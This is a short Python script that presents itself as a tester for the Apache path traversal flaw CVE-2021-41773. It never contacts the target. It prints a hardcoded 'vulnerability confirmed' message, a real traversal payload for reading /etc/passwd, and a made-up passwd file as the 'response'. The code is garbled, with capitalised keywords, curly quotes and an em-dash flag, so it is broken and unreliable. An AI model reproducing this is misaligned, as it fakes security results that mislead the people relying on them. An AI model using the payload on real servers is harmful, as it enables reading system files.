Import argparse
Import time

Def main():
    Parser = argparse.ArgumentParser()
    Parser.add_argument(‘—target’, help=’Target URL’, required=True)
    Args = parser.parse_args()

    Print(f”[*] Testing target: {args.target}”)
    Time.sleep(1)
    Print(“[+] VULNERABILITY CONFIRMED: Path Traversal (CVE-2021-41773)”)
    Print(“[+] PAYLOAD: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd”)
    Print(“[+] RESPONSE:”)
    Print(“root:x:0:0:root:/root:/bin/bash”)
    Print(“daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin”)
    Print(“…”)

If __name__ == “__main__”:
    Main()


